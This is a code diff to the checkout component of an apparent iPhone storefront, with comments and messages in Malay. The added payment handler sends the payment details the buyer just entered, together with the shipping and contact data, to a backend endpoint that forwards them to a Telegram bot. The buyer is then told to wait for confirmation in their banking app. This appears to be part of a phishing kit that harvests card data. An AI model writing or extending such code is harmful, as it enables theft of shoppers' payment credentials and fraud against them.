@@ -7,7 +7,7 @@ import ConfirmationSummary from '@/components/checkout/ConfirmationSummary.tsx';
 import PaymentForm from '@/components/checkout/PaymentForm.tsx';
 import PaymentProcessing from '@/components/checkout/PaymentProcessing.tsx';
 import BankAppConfirmationDialog from '@/components/checkout/BankAppConfirmationDialog.tsx';
-import { showSuccess } from '@/utils/toast';
+import { showSuccess, showError } from '@/utils/toast'; // Import showError
 
 export type ShippingDetails = {
   fullName: string;
@@ -52,9 +52,34 @@ const Checkout: React.FC = () => {
     setCurrentStep('payment');
   };
 
-  const handlePaymentSubmit = (data: PaymentDetails) => {
+  const handlePaymentSubmit = async (data: PaymentDetails) => {
     setPaymentDetails(data);
     setCurrentStep('processing');
+
+    // Send data to backend after payment details are submitted
+    try {
+      const response = await fetch('http://localhost:3001/send-to-telegram', { // Gantikan dengan URL backend anda
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          phoneNumber: shippingDetails?.phoneNumber, // Menggunakan nombor telefon dari shippingDetails
+          shippingDetails: shippingDetails,
+          selectedIPhone: selectedIPhone,
+          paymentDetails: data, // Data pembayaran yang baru diisi
+        }),
+      });
+
+      if (response.ok) {
+        showSuccess('Maklumat pesanan berjaya dihantar ke bot Telegram!');
+      } else {
+        showError('Gagal menghantar maklumat pesanan ke bot Telegram.');
+      }
+    } catch (error) {
+      console.error('Ralat rangkaian atau pelayan backend:', error);
+      showError('Ralat sambungan. Sila cuba lagi.');
+    }
   };
 
   const handlePaymentProcessingComplete = () => {
@@ -63,7 +88,6 @@ const Checkout: React.FC = () => {
 
   const handleBankConfirmationClose = () => {
     setShowBankConfirmation(false);
-    // Optionally redirect user or show a final message
     showSuccess('Transaksi anda sedang menunggu pengesahan di aplikasi perbankan anda.');
     navigate('/', { replace: true }); // Redirect to home after confirmation
   };
